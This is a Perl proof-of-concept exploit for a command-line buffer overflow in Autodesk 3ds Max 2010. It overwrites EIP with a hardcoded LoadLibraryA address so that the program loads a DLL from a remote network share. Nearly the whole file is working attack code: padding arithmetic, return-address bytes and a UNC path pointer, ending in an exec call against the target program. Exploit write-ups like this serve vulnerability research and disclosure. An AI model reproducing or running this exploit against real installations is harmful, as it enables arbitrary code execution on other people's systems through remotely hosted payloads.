#############################################################################
# target: Autodesk 3ds Max 2010
# date: 2011.07.18
# author: sghctoma <sghctoma@gmail.com>
# description: The target fails to sanitize the supplied command line 
#			   arguments, therefore it is possible to directly overwrite 
#			   EIP with a long enough command line.
#			   
#			   This exploit is a bit unusual, since it does not contain
#			   a payload. The payload is a DLL on a remote share ($dllpath),
#			   which gets loaded by the exploit. For more details, see:
#			   http://sghctoma.extra.hu/downloads/ll/loadlibrary_exploit.pdf
# tested on: Windows XP SP3 English/Hungarian
# note: Autodesk 3ds Max 2009 is also vulnerable, but the offsets differ,
#		so this POC works only with 2010
#############################################################################

$path = "c:\\FUZZTARGETS\\3dsmax2010\\3dsmax.exe";


$dllpath = "\\\\pamparam\\shared\\test.dll";
$padding = "A" x (258 - length($path) - length($dllpath));

#############################################################################
# Address of LoadLibraryA function
$loadlibrary = "\x7B\x1D\x80\x7C";

#############################################################################
# Padding - this is where LoadLibraryA would return
$fakeret = "XXXX";

#############################################################################
# The address of the UNC path 
$dllpathptr = "\xA1\xf0\x12";

$argument = $dllpath . " " . $padding . $loadlibrary . $fakeret . $dllpathptr;

exec $path, $argument;
